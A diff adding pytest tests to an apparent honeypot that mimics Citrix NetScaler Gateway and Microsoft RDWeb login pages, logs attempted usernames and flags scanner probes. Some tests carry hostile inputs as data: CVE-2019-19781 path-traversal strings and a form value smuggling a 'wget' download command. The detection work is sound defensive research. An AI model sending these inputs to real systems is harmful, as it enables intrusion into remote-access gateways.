@@ -2110,6 +2110,356 @@ async def test_dispatch_fortigate_disabled_returns_404(flux_client, monkeypatch)
     assert entries[-1]["result"] == "not-handled"
 
 
+# --- Citrix NetScaler / Gateway portal (CVE-2019-19781 / CVE-2023-3519 /
+#     CVE-2023-4966 / CVE-2022-27510 bait) ---
+
+
+def test_citrix_gateway_enabled_by_default():
+    assert tbenv.CITRIX_GATEWAY_ENABLED
+
+
+def test_citrix_gateway_default_paths_match_observed_probes():
+    for path in (
+        "/vpn/index.html",
+        "/logon/LogonPoint/index.html",
+        "/vpn/js/rdx/core/lang/rdx_en.json.gz",
+        "/cgi/login",
+        "/p/u/doAuthentication.do",
+        "/Citrix/XenApp/auth/login.aspx",
+    ):
+        assert tbenv.is_citrix_gateway_path(path), f"expected match: {path}"
+
+
+def test_citrix_gateway_path_non_match():
+    for path in (
+        "/",
+        "/vpn/",
+        "/logon/",
+        "/cgi/",
+        "/Citrix/",
+        "/.env",
+        "/remote/login",  # FortiGate, not Citrix
+    ):
+        assert not tbenv.is_citrix_gateway_path(path), f"unexpected match: {path}"
+
+
+def test_citrix_gateway_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "CITRIX_GATEWAY_ENABLED", False)
+    assert not tbenv.is_citrix_gateway_path("/vpn/index.html")
+
+
+def test_render_citrix_gateway_index_html_shape():
+    body = tbenv.render_citrix_gateway_index_html("citrix.example", "NS13.1: Build 49.13.nc").decode("utf-8")
+    assert "/cgi/login" in body
+    assert "NetScaler Gateway" in body
+    assert "NS13.1" in body
+    assert "citrix.example" in body
+
+
+def test_render_citrix_logonpoint_html_uses_same_post_action():
+    body = tbenv.render_citrix_logonpoint_html("citrix.example", "NS13.1").decode("utf-8")
+    assert "/cgi/login" in body
+    assert "Logon Point" in body or "log on" in body.lower()
+
+
+def test_render_citrix_xenapp_login_html_form_action():
+    body = tbenv.render_citrix_xenapp_login_html("xenapp.example").decode("utf-8")
+    assert "/Citrix/XenApp/auth/login.aspx" in body
+    assert "Citrix XenApp" in body
+
+
+def test_render_citrix_login_post_reflects_login_value():
+    # The submitted login is reflected in the noscript fallback so the
+    # failure page isn't a static body across hits.
+    body = tbenv.render_citrix_login_post("alice").decode("utf-8")
+    assert "alice" in body
+    body_html_safe = tbenv.render_citrix_login_post("bob").decode("utf-8")
+    assert "bob" in body_html_safe
+
+
+def test_extract_citrix_gateway_form_login_passwd():
+    body = b"login=admin&passwd=h%26unter2&dummy_username=ctx_dummy_username"
+    username, has_password = tbenv.extract_citrix_gateway_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "admin"
+    assert has_password is True
+
+
+def test_extract_citrix_gateway_form_xenapp_user_password():
+    # XenApp StoreFront uses `user` + `password` (not `login` + `passwd`).
+    body = b"user=alice&password=secret&domain="
+    username, has_password = tbenv.extract_citrix_gateway_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "alice"
+    assert has_password is True
+
+
+def test_citrix_has_cmd_injection_indicators():
+    # CVE-2019-19781 path-traversal pattern (Shitrix).
+    assert tbenv._citrix_has_cmd_injection("", "/vpn/../vpns/portal/scripts/newbm.pl", "")
+    assert tbenv._citrix_has_cmd_injection("", "/vpn/%2f..%2fvpns/portal/x", "")
+    # Generic shell-meta in the body.
+    assert tbenv._citrix_has_cmd_injection("login=admin;wget http://x/y", "/cgi/login", "")
+    # Plain login POST is not flagged.
+    assert not tbenv._citrix_has_cmd_injection("login=admin&passwd=p", "/cgi/login", "")
+
+
+async def test_dispatch_citrix_vpn_index_landing(flux_client):
+    resp = await flux_client.get(
+        "/vpn/index.html",
+        headers={"X-Forwarded-For": "203.0.113.150", "Host": "citrix.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "/cgi/login" in text
+    assert "NetScaler Gateway" in text
+    assert resp.headers.get("Server") == "NetScaler"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "citrix-vpn-index"
+    assert entry["citrixGatewayPath"] == "/vpn/index.html"
+
+
+async def test_dispatch_citrix_logonpoint_uses_mixed_case_path(flux_client):
+    # Real scanners send `/logon/LogonPoint/index.html` with that casing;
+    # confirm the case-insensitive match still routes to the handler.
+    resp = await flux_client.get(
+        "/logon/LogonPoint/index.html",
+        headers={"X-Forwarded-For": "203.0.113.151"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "citrix-logonpoint"
+
+
+async def test_dispatch_citrix_cgi_login_logs_username_and_sets_nsc_aaac_cookie(flux_client):
+    resp = await flux_client.post(
+        "/cgi/login",
+        data="login=admin&passwd=h%26unter2&dummy_username=ctx_dummy_username",
+        headers={
+            "X-Forwarded-For": "203.0.113.152",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    set_cookie = resp.headers.get("Set-Cookie", "")
+    assert "NSC_AAAC=" in set_cookie
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "citrix-cgi-login"
+    assert entry["citrixUsername"] == "admin"
+    assert entry["citrixHasPassword"] is True
+    assert "passwd" not in entry  # secret value never logged
+
+
+async def test_dispatch_citrix_cgi_login_cookie_per_request_unique(flux_client):
+    cookies = []
+    for i in range(2):
+        resp = await flux_client.post(
+            "/cgi/login",
+            data=f"login=u{i}&passwd=p",
+            headers={
+                "X-Forwarded-For": f"203.0.113.{160 + i}",
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+        )
+        assert resp.status == 200
+        cookies.append(resp.headers.get("Set-Cookie", ""))
+    assert cookies[0] != cookies[1]
+    assert "NSC_AAAC=" in cookies[0]
+    assert "NSC_AAAC=" in cookies[1]
+
+
+async def test_dispatch_citrix_xenapp_login_aspx_posts_log_credentials(flux_client):
+    resp = await flux_client.post(
+        "/Citrix/XenApp/auth/login.aspx",
+        data="user=alice&password=secret&domain=",
+        headers={
+            "X-Forwarded-For": "203.0.113.155",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "citrix-xenapp-login"
+    assert entry["citrixUsername"] == "alice"
+    assert entry["citrixHasPassword"] is True
+
+
+async def test_dispatch_citrix_flags_path_traversal_cmd_injection(flux_client):
+    # Even though `/vpn/../vpns/...` would fail nginx normalisation in
+    # practice, the cmd-injection flag is what we want to assert when
+    # the indicator string survives in the request body.
+    resp = await flux_client.post(
+        "/cgi/login",
+        data="login=admin&passwd=x&extra=/vpn/../vpns/portal/scripts/newbm.pl",
+        headers={
+            "X-Forwarded-For": "203.0.113.157",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "citrix-cgi-login"
+    assert entry["citrixHasCmdInjection"] is True
+
+
+async def test_dispatch_citrix_gateway_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "CITRIX_GATEWAY_ENABLED", False)
+    resp = await flux_client.get(
+        "/vpn/index.html",
+        headers={"X-Forwarded-For": "203.0.113.158"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Microsoft RDWeb (RD Web Access) trap ---
+
+
+def test_rdweb_enabled_by_default():
+    assert tbenv.RDWEB_ENABLED
+
+
+def test_rdweb_default_paths_match_observed_probes():
+    for path in (
+        "/RDWeb",
+        "/RDWeb/",
+        "/RDWeb/Pages/",
+        "/RDWeb/Pages/en-US/login.aspx",
+        "/RDWeb/Pages/en-US/Default.aspx",
+    ):
+        assert tbenv.is_rdweb_path(path), f"expected match: {path}"
+
+
+def test_rdweb_path_non_match():
+    for path in (
+        "/",
+        "/rdweb-foo",
+        "/RDWeb/Pages/foo.aspx",  # not in our default set
+        "/.env",
+        "/remote/login",
+    ):
+        assert not tbenv.is_rdweb_path(path), f"unexpected match: {path}"
+
+
+def test_rdweb_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "RDWEB_ENABLED", False)
+    assert not tbenv.is_rdweb_path("/RDWeb/Pages/en-US/login.aspx")
+
+
+def test_render_rdweb_login_html_shape():
+    body = tbenv.render_rdweb_login_html("rdweb.example", "10.0.17763").decode("utf-8")
+    assert "RD Web Access" in body
+    assert "/RDWeb/Pages/en-US/login.aspx" in body
+    assert "DomainUserName" in body
+    assert "UserPass" in body
+    assert "10.0.17763" in body
+
+
+def test_render_rdweb_login_html_viewstate_per_request_unique():
+    a = tbenv.render_rdweb_login_html("h", "10.0.17763").decode("utf-8")
+    b = tbenv.render_rdweb_login_html("h", "10.0.17763").decode("utf-8")
+    assert a != b, "VIEWSTATE must be per-request unique — never a fixed literal"
+
+
+def test_extract_rdweb_form_camel_case():
+    body = b"DomainUserName=DOMAIN%5Cadmin&UserPass=h%26unter2&MachineType=private"
+    username, has_password = tbenv.extract_rdweb_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "DOMAIN\\admin"
+    assert has_password is True
+
+
+def test_extract_rdweb_form_lowercase_fallback():
+    body = b"domainusername=admin&userpass=p"
+    username, has_password = tbenv.extract_rdweb_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "admin"
+    assert has_password is True
+
+
+async def test_dispatch_rdweb_login_landing(flux_client):
+    resp = await flux_client.get(
+        "/RDWeb/Pages/en-US/login.aspx",
+        headers={"X-Forwarded-For": "203.0.113.170", "Host": "rdweb.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "RD Web Access" in text
+    assert resp.headers.get("Server") == "Microsoft-IIS/10.0"
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "rdweb-login"
+    assert entry["rdwebPath"] == "/RDWeb/Pages/en-US/login.aspx"
+
+
+async def test_dispatch_rdweb_login_post_logs_username_and_sets_session_cookie(flux_client):
+    resp = await flux_client.post(
+        "/RDWeb/Pages/en-US/login.aspx",
+        data="DomainUserName=DOMAIN%5Cadmin&UserPass=hunter2&MachineType=private",
+        headers={
+            "X-Forwarded-For": "203.0.113.171",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    set_cookie = resp.headers.get("Set-Cookie", "")
+    assert "TSWAAuthHttpOnlyCookie=" in set_cookie
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "rdweb-login-post"
+    assert entry["rdwebUsername"] == "DOMAIN\\admin"
+    assert entry["rdwebHasPassword"] is True
+    assert "UserPass" not in entry  # secret value never logged
+
+
+async def test_dispatch_rdweb_login_post_cookie_per_request_unique(flux_client):
+    cookies = []
+    for i in range(2):
+        resp = await flux_client.post(
+            "/RDWeb/Pages/en-US/login.aspx",
+            data=f"DomainUserName=u{i}&UserPass=p",
+            headers={
+                "X-Forwarded-For": f"203.0.113.{180 + i}",
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+        )
+        assert resp.status == 200
+        cookies.append(resp.headers.get("Set-Cookie", ""))
+    assert cookies[0] != cookies[1]
+    assert "TSWAAuthHttpOnlyCookie=" in cookies[0]
+    assert "TSWAAuthHttpOnlyCookie=" in cookies[1]
+
+
+async def test_dispatch_rdweb_default_returns_empty_resource_list(flux_client):
+    resp = await flux_client.get(
+        "/RDWeb/Pages/en-US/Default.aspx",
+        headers={"X-Forwarded-For": "203.0.113.190"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "No resources" in text
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "rdweb-default"
+
+
+async def test_dispatch_rdweb_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "RDWEB_ENABLED", False)
+    resp = await flux_client.get(
+        "/RDWeb/Pages/en-US/login.aspx",
+        headers={"X-Forwarded-For": "203.0.113.191"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
 # --- Hikvision IP-camera ISAPI trap (CVE-2021-36260 bait) ---
 
 
